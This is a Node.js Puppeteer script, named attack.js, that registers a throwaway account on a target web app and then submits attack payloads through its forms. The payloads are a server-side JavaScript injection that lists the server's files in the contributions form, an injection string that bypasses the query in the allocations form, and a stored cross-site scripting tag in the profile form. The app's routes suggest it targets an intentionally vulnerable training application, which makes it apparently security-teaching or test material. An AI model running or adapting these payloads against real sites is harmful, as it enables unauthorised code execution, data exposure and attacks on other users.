const puppeteer = require('puppeteer');

(async () => {
  if (!process.env.BASEURL) {
      console.log('Please specify a base url. E.g. `BASEURL=http://example.org node attack.js`');
  } else {
    var browser;

    if (process.env.DEBUG) {
      browser = await puppeteer.launch({
          headless: false,
          executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      });
    } else {
      browser = await puppeteer.launch();
    }

    function delay(time) {
      return new Promise(function(resolve) { 
          setTimeout(resolve, time)
      });
    }

    const page = await browser.newPage()
    await page.setViewport({ width: 1366, height: 768});
    page.setDefaultNavigationTimeout(120000) //2 mins

    const navigationPromise = page.waitForNavigation()

    const pageOptions = {waitUntil: 'domcontentloaded'}
    const selectorOptions = {"timeout": 120000} //2 mins

    try {
      //Add error handling here in case the endpoint is not ready.
      await page.goto(process.env.BASEURL, pageOptions);
    } catch (error) {
      console.log(error);
      browser.close();
    }

    //Log in
    console.log('Registering');
    await page.goto(process.env.BASEURL + '/signup', pageOptions);

    await page.waitForSelector('input#userName', selectorOptions);
    await page.type('input#userName', Math.random().toString(36).substring(2, 15));

    await page.waitForSelector('input#firstName', selectorOptions)
    await page.type('input#firstName', 'John')

    await page.waitForSelector('input#lastName', selectorOptions)
    await page.type('input#lastName', 'Doe')

    await page.waitForSelector('input#password', selectorOptions)
    await page.type('input#password', 'password')

    await page.waitForSelector('input#verify', selectorOptions)
    await page.type('input#verify', 'password')

    await page.waitForSelector('form button', selectorOptions)
    await page.click('form button')

    await navigationPromise

    console.log('Pwn Contributions')
    await page.goto(process.env.BASEURL + '/contributions', pageOptions);

    await page.waitForSelector('input[name=preTax]', selectorOptions);
    await page.click('input[name=preTax]', { clickCount: 3 })
    await page.type('input[name=preTax]', "res.end(require('fs').readdirSync('.').toString())");

    await page.waitForSelector('form button[type=submit]', selectorOptions)
    await page.click('form button[type=submit]')

    await navigationPromise


    console.log('Pwn Allocations')
    await page.goto(process.env.BASEURL + '/allocations/4', pageOptions);

    await page.waitForSelector('input[name=threshold]', selectorOptions);
    await page.type('input[name=threshold]', "1'; return 1 == '1");

    await page.waitForSelector('form button[type=submit]', selectorOptions)
    await page.click('form button[type=submit]')

    await navigationPromise

    console.log('Pwn Profile')
    await page.goto(process.env.BASEURL + '/profile', pageOptions);

    await page.waitForSelector('input#firstName', selectorOptions)
    await page.type('input#firstName', '<script>print()</script>')

    await page.waitForSelector('input#bankRouting', selectorOptions)
    await page.type('input#bankRouting', ' 0198212#')

    await page.waitForSelector('form button[type=submit]', selectorOptions)
    await page.click('form button[type=submit]')

    await navigationPromise
    await delay(5000);

    //Quit
    if (!process.env.DEBUG) {await browser.close()}

  }
})()
